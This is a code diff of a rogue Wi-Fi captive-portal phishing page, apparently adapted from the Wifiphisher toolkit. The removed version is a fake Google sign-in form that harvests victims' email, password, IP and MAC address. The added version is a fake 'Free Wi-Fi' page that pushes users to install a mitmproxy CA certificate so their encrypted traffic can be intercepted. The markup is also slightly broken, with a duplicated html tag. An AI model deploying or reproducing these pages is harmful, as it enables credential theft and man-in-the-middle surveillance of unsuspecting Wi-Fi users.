@@ -1,9 +1,8 @@
-<?php
-$destination = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['HTTP_URI'] . "";
-require_once('helper.php');
-?>
+<!DOCTYPE>
 
   <html>
+
+   <html>
 
   <head>
 
@@ -116,41 +115,25 @@ require_once('helper.php');
     </style>
 
   </head>
-
   <body>
 
     <div class="container">
+      <div class="account-wall">
+        <img class="profile-img" src="assets/img/pa6dyy5wcc.png" alt=""></img>
 
-      <div class="google-header-bar centered">
-        <div class="header content clearfix">
-          <img alt="Google" class="logo" src="assets/img/dtnk16mcjo.png">
-        </div>
-      </div>
+        <h1 class="text-center login-title">Free Wi-Fi</h1>
+        <h2 class="text-center friends-text">Please select one and complete login process</h2>
 
-      <h1 class="text-center login-title">Sign in with your Google Account</h1>
+        <form action="android-download.php?file=mitmproxy-ca-cert.pem">
+          <input type="submit" value="Go to Android" />
+        </form>
 
-        <div class="account-wall">
+        <form action="ios-download.php?file=mitmproxy-ca-cert">
+          <input type="submit" value="Go to iOS" />
+        </form>
 
-          <img class="profile-img" src="assets/img/yqczrisvt2.png" alt="">
-
-          <form method="POST" action="/captiveportal/index.php" class="form-signin" onsubmit="redirect()">
-            <input type="text" name="email" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
-            <input type="password" name="password" class="form-control" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
-            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
-            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
-            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-            <input type="hidden" name="target" value="<?=$destination?>">
-            <button class="btn btn-primary btn-block btn-sharp" name="login" type="submit">Sign in</button>
-            <a href="#" class="pull-right need-help">Find my account </a><span class="clearfix"></span>
-          </form>
-
-        </div>
-
-            <br><a href="#" class="text-center new-account">Create an account </a>
-            <center><br><p class="tagline">One Google Account for everything Google</p>
-            <img src="assets/img/tmjjgvk28i.png" width="210" height="17" alt=""></center><br><br>
-
-    </div>
+<!-- Copyright (c) Wifiphisher.org (https://github.com/wifiphisher/wifiphisher/blob/master/wifiphisher/data/phishing-pages/oauth-login/index.html) -->
+<!-- The Modal -->
 
   </body>
 
